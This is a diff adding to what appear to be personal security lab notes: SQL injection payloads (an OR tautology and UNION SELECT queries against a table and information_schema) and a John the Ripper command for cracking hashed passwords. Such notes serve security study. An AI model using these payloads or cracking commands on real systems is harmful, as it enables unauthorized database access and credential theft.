@@ -49,8 +49,25 @@ Good Day!
 - Directory listing of C drive in Win10 VM shown
 
 ## SQL Injection
-
+- Basic injection command:
 ```sql
 ppp' or '0' = '0
 ```
 
+- Retrieve more columns from table:
+```sql
+ppp' or '0' = '0' union select column1, column2 from table --
+```
+
+- Retrieve `information_schema` from database
+```sql
+ppp' or '0' = '0' union select table_schema, table_name from information_schema.tables --
+```
+
+## John The Ripper
+- Crack hashed passwords inside <u>password.txt</u>
+```
+sudo john password.txt
+```
+
+- 
